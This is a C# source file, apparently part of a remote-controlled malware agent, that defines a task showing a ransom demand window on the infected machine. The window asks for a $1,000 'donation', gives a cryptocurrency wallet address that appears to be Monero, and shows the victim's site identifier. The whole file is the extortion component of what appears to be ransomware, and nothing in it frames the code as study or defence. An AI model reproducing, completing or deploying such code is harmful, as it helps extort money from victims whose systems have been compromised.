using FileConnector.Models;
using FileConnector.Utils;
using FileConnectorCommon;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FileConnector.ServerTasks.Impl
{
    class TaskAgentUnhideMessage
    {
        private Logger log;
        private static DriverConfig cfg;

        private string message;
        public TaskAgentUnhideMessage()
        {
            log = Config.ConfigLog.getLog();
            cfg = Config.ConfigFile.getCfg();
            message = "\u2620 Your small donation of $1,000 is appreciated! \u2620\n"
            + "ɱ: 888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjy \u2936\n"
            + "Pbb3iQ1YBRk1UXcdRsiKc9dhwMVgN5S9cQUiyoogDavup3H\n"
            + "\n\nIdentifier: " + cfg.Keys.SiteID;
        }
        public void Run()
        {
            try
            {
                IntPtr h = Config.ConfigProcess.getHandle();
                log.Debug($"Window handle: ({h})");

                try
                {
                    var feGUI = new FrontEndGUI(message);
                    var newThread = new Thread(feGUI.frmNewFormThread);

                    newThread.SetApartmentState(ApartmentState.STA);
                    newThread.Start();
                }catch (Exception e)
                {
                    log.Debug($"Error unhiding message: ({e.Message} {e.InnerException.Message})");
                }

                // new Thread(() => System.Windows.Forms.MessageBox.Show("hi!")).Start();
            }
            catch (Exception e)
            {
                log.Debug($"Unable to get window handle: {e.Message}");
            }

        }

    }
}
